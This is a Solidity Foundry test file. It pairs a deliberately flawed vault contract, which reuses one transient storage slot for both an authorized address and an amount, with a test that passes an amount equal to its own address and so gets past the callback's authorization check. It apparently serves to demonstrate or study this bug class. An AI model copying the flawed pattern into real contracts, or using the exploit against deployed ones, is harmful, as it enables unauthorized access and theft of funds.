// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SimpleCommunityvault {
    // mint function
    function earnKarma(uint256 amountToSupport) external returns (uint256) {
        // Write vault address (address(this)) to transient storage
        address creatorVault = address(this);
        assembly {
            tstore(1, creatorVault)
        }

        // Directly call own callback function
        this.ConvertpointsCallback(amountToSupport, "");

    }

    // Simulate SwapCallback callback function
    function ConvertpointsCallback(uint256 amount ,bytes calldata data) external {
        // Read vault address from transient storage
        address creatorVault;
        assembly {
            creatorVault := tload(1)
        }

        // Check if caller is a legitimate vault
        require(msg.sender == creatorVault, "Not authorized");

        if (creatorVault == address(this)) {
            // Output vault address for observation
            console.log("vault address:", creatorVault);
            // Write the returned amount to transient storage
            assembly {
                tstore(1, amount)
            }
        } else {
            console.log("Manipulated vault address:", creatorVault);
        }
    }

}

contract TransientStorageMisuseTest is Test {
    SimpleCommunityvault creatorVault;

    function setUp() public {
        creatorVault = new SimpleCommunityvault();
    }

    function testStorageOperation() public {
        // First, let's check what address we want to get
        console.log("Target address:", address(this));

        // Convert the address to uint256
        uint256 amount = uint256(uint160(address(this)));
        emit log_named_uint("Amount needed", amount);

        // Now use this amount in the mint function
        creatorVault.earnKarma(amount);

        creatorVault.ConvertpointsCallback(0, "");
    }
}